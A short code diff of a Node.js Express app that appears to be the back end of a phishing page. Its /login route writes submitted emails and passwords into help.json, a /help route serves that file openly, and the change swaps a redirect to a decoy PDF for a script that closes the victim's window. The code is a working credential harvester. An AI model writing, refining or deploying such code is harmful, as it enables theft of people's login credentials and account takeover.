@@ -36,7 +36,8 @@ app.get('/login', (req, res) => {
 	currentdata=JSON.parse(fs.readFileSync('./help.json', 'utf8'));
 	currentdata[email]=pw;
 	fs.writeFileSync('./help.json', JSON.stringify(currentdata));
-    res.redirect("./pdf.pdf")
+    //res.redirect("./pdf.pdf")
+    res.send("<script>window.close()</script>")
 })
 app.get('/help', (req, res) => {
     res.sendFile(path.join(dir,"help.json"))
